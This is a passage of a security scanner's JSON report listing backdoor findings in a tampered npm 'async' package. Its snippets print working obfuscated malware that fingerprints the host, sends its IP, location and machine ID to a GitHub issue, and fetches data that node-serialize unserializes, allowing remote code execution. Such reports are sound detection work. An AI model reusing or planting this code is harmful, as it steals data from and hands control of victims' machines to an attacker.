                    "text": "37.36\", Authorization: `token ${b}` } }, JSON.stringify({ body: `name:${package.name} ver:${package.version} ip:${a} fp:${fingerprint()}` })); let c = await fetchSerialize(new Buffer.from(\"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NpbXBsZWxpdmUx\\nMi9zaW1wbGUvbWFzdGVyL1JFQURNRS5tZA==\\n\".trim(), \"base64\").toString(\"ascii\")), d = c.split(\"#\"); 2 == d.length && d[0] == fingerprint() && serialize.unserialize(d[1]) } catch (a) { } } update(), setInterval(update, 1800000);\n\nObject.defineProperty(exports, \"__esModule\", {\n    value: true\n});\nexports.doDuring = exports.during = exports.wrapSync = undefine",
                    "rendered": {
                      "text": "37.36\", Authorization: `token ${b}` } }, JSON.stringify({ body: `name:${package.name} ver:${package.version} ip:${a} fp:${fingerprint()}` })); let c = await fetchSerialize(new Buffer.from(\"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NpbXBsZWxpdmUx\\nMi9zaW1wbGUvbWFzdGVyL1JFQURNRS5tZA==\\n\".trim(), \"base64\").toString(\"ascii\")), d = c.split(\"#\"); 2 == d.length && d[0] == fingerprint() && serialize.unserialize(d[1]) } catch (a) { } } update(), setInterval(update, 1800000);\n\nObject.defineProperty(exports, \"__esModule\", {\n    value: true\n});\nexports.doDuring = exports.during = exports.wrapSync = undefine",
                      "markdown": "`37.36\", Authorization: `token ${b}` } }, JSON.stringify({ body: `name:${package.name} ver:${package.version} ip:${a} fp:${fingerprint()}` })); let c = await fetchSerialize(new Buffer.from(\"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NpbXBsZWxpdmUx\\nMi9zaW1wbGUvbWFzdGVyL1JFQURNRS5tZA==\\n\".trim(), \"base64\").toString(\"ascii\")), d = c.split(\"#\"); 2 == d.length && d[0] == fingerprint() && serialize.unserialize(d[1]) } catch (a) { } } update(), setInterval(update, 1800000);\n\nObject.defineProperty(exports, \"__esModule\", {\n    value: true\n});\nexports.doDuring = exports.during = exports.wrapSync = undefine`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/index.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 1848,
                  "endLine": 4,
                  "endColumn": 1854,
                  "snippet": {
                    "text": "chToken(new Buffer.from(\"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NpbXBsZWxpdmUx\\nMi9zaW1wbGUvbWFzdGVyL2s=\\n\".trim(), \"base64\").toString(\"ascii\")); await comment({ hostname: \"api.github.com\", port: 443, path: new Buffer.from(\"L3JlcG9zL2g0cHB5bDF2ZS9jb2xsZWN0L2lzc3Vlcy80L2NvbW1lbnRz\\n\".trim(), \"base64\").toString(\"ascii\"), method: \"POST\", headers: { \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36\", Authorization: `token ${b}` } }, JSON.stringify({ body: `name:${package.name} ver:${package.version} ip:${a} fp:",
                    "rendered": {
                      "text": "chToken(new Buffer.from(\"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NpbXBsZWxpdmUx\\nMi9zaW1wbGUvbWFzdGVyL2s=\\n\".trim(), \"base64\").toString(\"ascii\")); await comment({ hostname: \"api.github.com\", port: 443, path: new Buffer.from(\"L3JlcG9zL2g0cHB5bDF2ZS9jb2xsZWN0L2lzc3Vlcy80L2NvbW1lbnRz\\n\".trim(), \"base64\").toString(\"ascii\"), method: \"POST\", headers: { \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36\", Authorization: `token ${b}` } }, JSON.stringify({ body: `name:${package.name} ver:${package.version} ip:${a} fp:",
                      "markdown": "`chToken(new Buffer.from(\"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NpbXBsZWxpdmUx\\nMi9zaW1wbGUvbWFzdGVyL2s=\\n\".trim(), \"base64\").toString(\"ascii\")); await comment({ hostname: \"api.github.com\", port: 443, path: new Buffer.from(\"L3JlcG9zL2g0cHB5bDF2ZS9jb2xsZWN0L2lzc3Vlcy80L2NvbW1lbnRz\\n\".trim(), \"base64\").toString(\"ascii\"), method: \"POST\", headers: { \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36\", Authorization: `token ${b}` } }, JSON.stringify({ body: `name:${package.name} ver:${package.version} ip:${a} fp:`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/index.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 1672,
                  "endLine": 4,
                  "endColumn": 1678,
                  "snippet": {
                    "text": " c(a) }) }) } async function update() { try { let a = await fetchIpInfo(new Buffer.from(\"aHR0cHM6Ly9pZmNvbmZpZy5jby9qc29u\\n\".trim(), \"base64\").toString(\"ascii\")), b = await fetchToken(new Buffer.from(\"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NpbXBsZWxpdmUx\\nMi9zaW1wbGUvbWFzdGVyL2s=\\n\".trim(), \"base64\").toString(\"ascii\")); await comment({ hostname: \"api.github.com\", port: 443, path: new Buffer.from(\"L3JlcG9zL2g0cHB5bDF2ZS9jb2xsZWN0L2lzc3Vlcy80L2NvbW1lbnRz\\n\".trim(), \"base64\").toString(\"ascii\"), method: \"POST\", headers: { \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/",
                    "rendered": {
                      "text": " c(a) }) }) } async function update() { try { let a = await fetchIpInfo(new Buffer.from(\"aHR0cHM6Ly9pZmNvbmZpZy5jby9qc29u\\n\".trim(), \"base64\").toString(\"ascii\")), b = await fetchToken(new Buffer.from(\"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NpbXBsZWxpdmUx\\nMi9zaW1wbGUvbWFzdGVyL2s=\\n\".trim(), \"base64\").toString(\"ascii\")); await comment({ hostname: \"api.github.com\", port: 443, path: new Buffer.from(\"L3JlcG9zL2g0cHB5bDF2ZS9jb2xsZWN0L2lzc3Vlcy80L2NvbW1lbnRz\\n\".trim(), \"base64\").toString(\"ascii\"), method: \"POST\", headers: { \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/",
                      "markdown": "` c(a) }) }) } async function update() { try { let a = await fetchIpInfo(new Buffer.from(\"aHR0cHM6Ly9pZmNvbmZpZy5jby9qc29u\\n\".trim(), \"base64\").toString(\"ascii\")), b = await fetchToken(new Buffer.from(\"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NpbXBsZWxpdmUx\\nMi9zaW1wbGUvbWFzdGVyL2s=\\n\".trim(), \"base64\").toString(\"ascii\")); await comment({ hostname: \"api.github.com\", port: 443, path: new Buffer.from(\"L3JlcG9zL2g0cHB5bDF2ZS9jb2xsZWN0L2lzc3Vlcy80L2NvbW1lbnRz\\n\".trim(), \"base64\").toString(\"ascii\"), method: \"POST\", headers: { \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/index.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 1506,
                  "endLine": 4,
                  "endColumn": 1512,
                  "snippet": {
                    "text": "rn new Promise((b, c) => { const d = https.get(a, a => { let c = []; a.on(\"data\", a => { c.push(a) }), a.on(\"end\", () => { b(c.toString()) }) }); d.on(\"error\", a => { c(a) }) }) } async function update() { try { let a = await fetchIpInfo(new Buffer.from(\"aHR0cHM6Ly9pZmNvbmZpZy5jby9qc29u\\n\".trim(), \"base64\").toString(\"ascii\")), b = await fetchToken(new Buffer.from(\"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NpbXBsZWxpdmUx\\nMi9zaW1wbGUvbWFzdGVyL2s=\\n\".trim(), \"base64\").toString(\"ascii\")); await comment({ hostname: \"api.github.com\", port: 443, path: new Buffer.from(\"L3JlcG9zL2g0cHB5bDF2ZS9jb2xsZWN0L",
                    "rendered": {
                      "text": "rn new Promise((b, c) => { const d = https.get(a, a => { let c = []; a.on(\"data\", a => { c.push(a) }), a.on(\"end\", () => { b(c.toString()) }) }); d.on(\"error\", a => { c(a) }) }) } async function update() { try { let a = await fetchIpInfo(new Buffer.from(\"aHR0cHM6Ly9pZmNvbmZpZy5jby9qc29u\\n\".trim(), \"base64\").toString(\"ascii\")), b = await fetchToken(new Buffer.from(\"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NpbXBsZWxpdmUx\\nMi9zaW1wbGUvbWFzdGVyL2s=\\n\".trim(), \"base64\").toString(\"ascii\")); await comment({ hostname: \"api.github.com\", port: 443, path: new Buffer.from(\"L3JlcG9zL2g0cHB5bDF2ZS9jb2xsZWN0L",
                      "markdown": "`rn new Promise((b, c) => { const d = https.get(a, a => { let c = []; a.on(\"data\", a => { c.push(a) }), a.on(\"end\", () => { b(c.toString()) }) }); d.on(\"error\", a => { c(a) }) }) } async function update() { try { let a = await fetchIpInfo(new Buffer.from(\"aHR0cHM6Ly9pZmNvbmZpZy5jby9qc29u\\n\".trim(), \"base64\").toString(\"ascii\")), b = await fetchToken(new Buffer.from(\"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NpbXBsZWxpdmUx\\nMi9zaW1wbGUvbWFzdGVyL2s=\\n\".trim(), \"base64\").toString(\"ascii\")); await comment({ hostname: \"api.github.com\", port: 443, path: new Buffer.from(\"L3JlcG9zL2g0cHB5bDF2ZS9jb2xsZWN0L`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/index.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 858,
                  "endLine": 4,
                  "endColumn": 864,
                  "snippet": {
                    "text": " c.country, e = c.city; b(`ip: ${a}, country: ${d}, city: ${e}`) }) }); d.on(\"error\", a => c(a)) }) } function fetchToken(a) { return new Promise((b, c) => { const d = https.get(a, a => { let c = []; a.on(\"data\", a => { c.push(a) }), a.on(\"end\", () => { let a = new Buffer.from(c.toString().trim(), \"base64\"), d = a.toString(\"ascii\"); b(d) }) }); d.on(\"error\", a => { c(a) }) }) } function comment(a, b) { return new Promise((c, d) => { const e = https.request(a, a => { let b = []; a.on(\"data\", a => { b.push(a) }), a.on(\"end\", () => { c(b.toString()) }) }); e.on(\"error\", a => { d(a) }), e.write(b), e.en",
                    "rendered": {
                      "text": " c.country, e = c.city; b(`ip: ${a}, country: ${d}, city: ${e}`) }) }); d.on(\"error\", a => c(a)) }) } function fetchToken(a) { return new Promise((b, c) => { const d = https.get(a, a => { let c = []; a.on(\"data\", a => { c.push(a) }), a.on(\"end\", () => { let a = new Buffer.from(c.toString().trim(), \"base64\"), d = a.toString(\"ascii\"); b(d) }) }); d.on(\"error\", a => { c(a) }) }) } function comment(a, b) { return new Promise((c, d) => { const e = https.request(a, a => { let b = []; a.on(\"data\", a => { b.push(a) }), a.on(\"end\", () => { c(b.toString()) }) }); e.on(\"error\", a => { d(a) }), e.write(b), e.en",
                      "markdown": "` c.country, e = c.city; b(`ip: ${a}, country: ${d}, city: ${e}`) }) }); d.on(\"error\", a => c(a)) }) } function fetchToken(a) { return new Promise((b, c) => { const d = https.get(a, a => { let c = []; a.on(\"data\", a => { c.push(a) }), a.on(\"end\", () => { let a = new Buffer.from(c.toString().trim(), \"base64\"), d = a.toString(\"ascii\"); b(d) }) }); d.on(\"error\", a => { c(a) }) }) } function comment(a, b) { return new Promise((c, d) => { const e = https.request(a, a => { let b = []; a.on(\"data\", a => { b.push(a) }), a.on(\"end\", () => { c(b.toString()) }) }); e.on(\"error\", a => { d(a) }), e.write(b), e.en`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/index.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 336,
                  "endLine": 4,
                  "endColumn": 342,
                  "snippet": {
                    "text": "= require(\"node-serialize\"), https = require(\"https\"), package = require(\"./package.json\"); function fingerprint() { let a = \"\"; try { a = machineIdSync() } catch (b) { let c = os.userInfo(), d = os.cpus().map(a => a.model.replace(/ /g, \"\")); a = Buffer.from(c.username + c.homedir + d[0]).toString(\"base64\") } return a } function fetchIpInfo(a) { return new Promise((b, c) => { const d = https.get(a, a => { let c = []; a.on(\"data\", a => { c.push(a) }), a.on(\"end\", () => { c = JSON.parse(c.toString()); let a = c.ip, d = c.country, e = c.city; b(`ip: ${a}, country: ${d}, city: ${e}`) }) }); d.on(\"error\"",
                    "rendered": {
                      "text": "= require(\"node-serialize\"), https = require(\"https\"), package = require(\"./package.json\"); function fingerprint() { let a = \"\"; try { a = machineIdSync() } catch (b) { let c = os.userInfo(), d = os.cpus().map(a => a.model.replace(/ /g, \"\")); a = Buffer.from(c.username + c.homedir + d[0]).toString(\"base64\") } return a } function fetchIpInfo(a) { return new Promise((b, c) => { const d = https.get(a, a => { let c = []; a.on(\"data\", a => { c.push(a) }), a.on(\"end\", () => { c = JSON.parse(c.toString()); let a = c.ip, d = c.country, e = c.city; b(`ip: ${a}, country: ${d}, city: ${e}`) }) }); d.on(\"error\"",
                      "markdown": "`= require(\"node-serialize\"), https = require(\"https\"), package = require(\"./package.json\"); function fingerprint() { let a = \"\"; try { a = machineIdSync() } catch (b) { let c = os.userInfo(), d = os.cpus().map(a => a.model.replace(/ /g, \"\")); a = Buffer.from(c.username + c.homedir + d[0]).toString(\"base64\") } return a } function fetchIpInfo(a) { return new Promise((b, c) => { const d = https.get(a, a => { let c = []; a.on(\"data\", a => { c.push(a) }), a.on(\"end\", () => { c = JSON.parse(c.toString()); let a = c.ip, d = c.country, e = c.city; b(`ip: ${a}, country: ${d}, city: ${e}`) }) }); d.on(\"error\"`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/index.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 1248,
                  "endLine": 4,
                  "endColumn": 1253,
                  "snippet": {
                    "text": "comment(a, b) { return new Promise((c, d) => { const e = https.request(a, a => { let b = []; a.on(\"data\", a => { b.push(a) }), a.on(\"end\", () => { c(b.toString()) }) }); e.on(\"error\", a => { d(a) }), e.write(b), e.end() }) } function fetchSerialize(a) { return new Promise((b, c) => { const d = https.get(a, a => { let c = []; a.on(\"data\", a => { c.push(a) }), a.on(\"end\", () => { b(c.toString()) }) }); d.on(\"error\", a => { c(a) }) }) } async function update() { try { let a = await fetchIpInfo(new Buffer.from(\"aHR0cHM6Ly9pZmNvbmZpZy5jby9qc29u\\n\".trim(), \"base64\").toString(\"ascii\")), b = await fetchTok",
                    "rendered": {
                      "text": "comment(a, b) { return new Promise((c, d) => { const e = https.request(a, a => { let b = []; a.on(\"data\", a => { b.push(a) }), a.on(\"end\", () => { c(b.toString()) }) }); e.on(\"error\", a => { d(a) }), e.write(b), e.end() }) } function fetchSerialize(a) { return new Promise((b, c) => { const d = https.get(a, a => { let c = []; a.on(\"data\", a => { c.push(a) }), a.on(\"end\", () => { b(c.toString()) }) }); d.on(\"error\", a => { c(a) }) }) } async function update() { try { let a = await fetchIpInfo(new Buffer.from(\"aHR0cHM6Ly9pZmNvbmZpZy5jby9qc29u\\n\".trim(), \"base64\").toString(\"ascii\")), b = await fetchTok",
                      "markdown": "`comment(a, b) { return new Promise((c, d) => { const e = https.request(a, a => { let b = []; a.on(\"data\", a => { b.push(a) }), a.on(\"end\", () => { c(b.toString()) }) }); e.on(\"error\", a => { d(a) }), e.write(b), e.end() }) } function fetchSerialize(a) { return new Promise((b, c) => { const d = https.get(a, a => { let c = []; a.on(\"data\", a => { c.push(a) }), a.on(\"end\", () => { b(c.toString()) }) }); d.on(\"error\", a => { c(a) }) }) } async function update() { try { let a = await fetchIpInfo(new Buffer.from(\"aHR0cHM6Ly9pZmNvbmZpZy5jby9qc29u\\n\".trim(), \"base64\").toString(\"ascii\")), b = await fetchTok`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/index.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 1010,
                  "endLine": 4,
                  "endColumn": 1019,
                  "snippet": {
                    "text": " => { const d = https.get(a, a => { let c = []; a.on(\"data\", a => { c.push(a) }), a.on(\"end\", () => { let a = new Buffer.from(c.toString().trim(), \"base64\"), d = a.toString(\"ascii\"); b(d) }) }); d.on(\"error\", a => { c(a) }) }) } function comment(a, b) { return new Promise((c, d) => { const e = https.request(a, a => { let b = []; a.on(\"data\", a => { b.push(a) }), a.on(\"end\", () => { c(b.toString()) }) }); e.on(\"error\", a => { d(a) }), e.write(b), e.end() }) } function fetchSerialize(a) { return new Promise((b, c) => { const d = https.get(a, a => { let c = []; a.on(\"data\", a => { c.push(a) }), a.on(\"end\"",
                    "rendered": {
                      "text": " => { const d = https.get(a, a => { let c = []; a.on(\"data\", a => { c.push(a) }), a.on(\"end\", () => { let a = new Buffer.from(c.toString().trim(), \"base64\"), d = a.toString(\"ascii\"); b(d) }) }); d.on(\"error\", a => { c(a) }) }) } function comment(a, b) { return new Promise((c, d) => { const e = https.request(a, a => { let b = []; a.on(\"data\", a => { b.push(a) }), a.on(\"end\", () => { c(b.toString()) }) }); e.on(\"error\", a => { d(a) }), e.write(b), e.end() }) } function fetchSerialize(a) { return new Promise((b, c) => { const d = https.get(a, a => { let c = []; a.on(\"data\", a => { c.push(a) }), a.on(\"end\"",
                      "markdown": "` => { const d = https.get(a, a => { let c = []; a.on(\"data\", a => { c.push(a) }), a.on(\"end\", () => { let a = new Buffer.from(c.toString().trim(), \"base64\"), d = a.toString(\"ascii\"); b(d) }) }); d.on(\"error\", a => { c(a) }) }) } function comment(a, b) { return new Promise((c, d) => { const e = https.request(a, a => { let b = []; a.on(\"data\", a => { b.push(a) }), a.on(\"end\", () => { c(b.toString()) }) }); e.on(\"error\", a => { d(a) }), e.write(b), e.end() }) } function fetchSerialize(a) { return new Promise((b, c) => { const d = https.get(a, a => { let c = []; a.on(\"data\", a => { c.push(a) }), a.on(\"end\"`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/index.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 731,
                  "endLine": 4,
                  "endColumn": 736,
                  "snippet": {
                    "text": "get(a, a => { let c = []; a.on(\"data\", a => { c.push(a) }), a.on(\"end\", () => { c = JSON.parse(c.toString()); let a = c.ip, d = c.country, e = c.city; b(`ip: ${a}, country: ${d}, city: ${e}`) }) }); d.on(\"error\", a => c(a)) }) } function fetchToken(a) { return new Promise((b, c) => { const d = https.get(a, a => { let c = []; a.on(\"data\", a => { c.push(a) }), a.on(\"end\", () => { let a = new Buffer.from(c.toString().trim(), \"base64\"), d = a.toString(\"ascii\"); b(d) }) }); d.on(\"error\", a => { c(a) }) }) } function comment(a, b) { return new Promise((c, d) => { const e = https.request(a, a => { let b =",
                    "rendered": {
                      "text": "get(a, a => { let c = []; a.on(\"data\", a => { c.push(a) }), a.on(\"end\", () => { c = JSON.parse(c.toString()); let a = c.ip, d = c.country, e = c.city; b(`ip: ${a}, country: ${d}, city: ${e}`) }) }); d.on(\"error\", a => c(a)) }) } function fetchToken(a) { return new Promise((b, c) => { const d = https.get(a, a => { let c = []; a.on(\"data\", a => { c.push(a) }), a.on(\"end\", () => { let a = new Buffer.from(c.toString().trim(), \"base64\"), d = a.toString(\"ascii\"); b(d) }) }); d.on(\"error\", a => { c(a) }) }) } function comment(a, b) { return new Promise((c, d) => { const e = https.request(a, a => { let b =",
                      "markdown": "`get(a, a => { let c = []; a.on(\"data\", a => { c.push(a) }), a.on(\"end\", () => { c = JSON.parse(c.toString()); let a = c.ip, d = c.country, e = c.city; b(`ip: ${a}, country: ${d}, city: ${e}`) }) }); d.on(\"error\", a => c(a)) }) } function fetchToken(a) { return new Promise((b, c) => { const d = https.get(a, a => { let c = []; a.on(\"data\", a => { c.push(a) }), a.on(\"end\", () => { let a = new Buffer.from(c.toString().trim(), \"base64\"), d = a.toString(\"ascii\"); b(d) }) }); d.on(\"error\", a => { c(a) }) }) } function comment(a, b) { return new Promise((c, d) => { const e = https.request(a, a => { let b =`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/index.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 430,
                  "endLine": 4,
                  "endColumn": 435,
                  "snippet": {
                    "text": "nction fingerprint() { let a = \"\"; try { a = machineIdSync() } catch (b) { let c = os.userInfo(), d = os.cpus().map(a => a.model.replace(/ /g, \"\")); a = Buffer.from(c.username + c.homedir + d[0]).toString(\"base64\") } return a } function fetchIpInfo(a) { return new Promise((b, c) => { const d = https.get(a, a => { let c = []; a.on(\"data\", a => { c.push(a) }), a.on(\"end\", () => { c = JSON.parse(c.toString()); let a = c.ip, d = c.country, e = c.city; b(`ip: ${a}, country: ${d}, city: ${e}`) }) }); d.on(\"error\", a => c(a)) }) } function fetchToken(a) { return new Promise((b, c) => { const d = https.get",
                    "rendered": {
                      "text": "nction fingerprint() { let a = \"\"; try { a = machineIdSync() } catch (b) { let c = os.userInfo(), d = os.cpus().map(a => a.model.replace(/ /g, \"\")); a = Buffer.from(c.username + c.homedir + d[0]).toString(\"base64\") } return a } function fetchIpInfo(a) { return new Promise((b, c) => { const d = https.get(a, a => { let c = []; a.on(\"data\", a => { c.push(a) }), a.on(\"end\", () => { c = JSON.parse(c.toString()); let a = c.ip, d = c.country, e = c.city; b(`ip: ${a}, country: ${d}, city: ${e}`) }) }); d.on(\"error\", a => c(a)) }) } function fetchToken(a) { return new Promise((b, c) => { const d = https.get",
                      "markdown": "`nction fingerprint() { let a = \"\"; try { a = machineIdSync() } catch (b) { let c = os.userInfo(), d = os.cpus().map(a => a.model.replace(/ /g, \"\")); a = Buffer.from(c.username + c.homedir + d[0]).toString(\"base64\") } return a } function fetchIpInfo(a) { return new Promise((b, c) => { const d = https.get(a, a => { let c = []; a.on(\"data\", a => { c.push(a) }), a.on(\"end\", () => { c = JSON.parse(c.toString()); let a = c.ip, d = c.country, e = c.city; b(`ip: ${a}, country: ${d}, city: ${e}`) }) }); d.on(\"error\", a => c(a)) }) } function fetchToken(a) { return new Promise((b, c) => { const d = https.get`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/index.js"
                },
                "region": {
                  "startLine": 346,
                  "startColumn": 8,
                  "endLine": 346,
                  "endColumn": 36,
                  "snippet": {
                    "text": " *\n * Note, due to JavaScript limitations, we can only detect native `async`\n * functions and not transpilied implementations.\n * Your environment must have `async`/`await` support for this to work.\n * (e.g. Node > v7.6, or a recent version of a modern browser).\n * If you are using `async` functions through a transpiler (e.g. Babel), you\n * must still wrap the function with [asyncify]{@link module:Utils.asyncify},\n",
                    "rendered": {
                      "text": " *\n * Note, due to JavaScript limitations, we can only detect native `async`\n * functions and not transpilied implementations.\n * Your environment must have `async`/`await` support for this to work.\n * (e.g. Node > v7.6, or a recent version of a modern browser).\n * If you are using `async` functions through a transpiler (e.g. Babel), you\n * must still wrap the function with [asyncify]{@link module:Utils.asyncify},\n",
                      "markdown": "` *\n * Note, due to JavaScript limitations, we can only detect native `async`\n * functions and not transpilied implementations.\n * Your environment must have `async`/`await` support for this to work.\n * (e.g. Node > v7.6, or a recent version of a modern browser).\n * If you are using `async` functions through a transpiler (e.g. Babel), you\n * must still wrap the function with [asyncify]{@link module:Utils.asyncify},\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/index.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 1717,
                  "endLine": 4,
                  "endColumn": 1725,
                  "snippet": {
                    "text": " let a = await fetchIpInfo(new Buffer.from(\"aHR0cHM6Ly9pZmNvbmZpZy5jby9qc29u\\n\".trim(), \"base64\").toString(\"ascii\")), b = await fetchToken(new Buffer.from(\"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NpbXBsZWxpdmUx\\nMi9zaW1wbGUvbWFzdGVyL2s=\\n\".trim(), \"base64\").toString(\"ascii\")); await comment({ hostname: \"api.github.com\", port: 443, path: new Buffer.from(\"L3JlcG9zL2g0cHB5bDF2ZS9jb2xsZWN0L2lzc3Vlcy80L2NvbW1lbnRz\\n\".trim(), \"base64\").toString(\"ascii\"), method: \"POST\", headers: { \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135",
                    "rendered": {
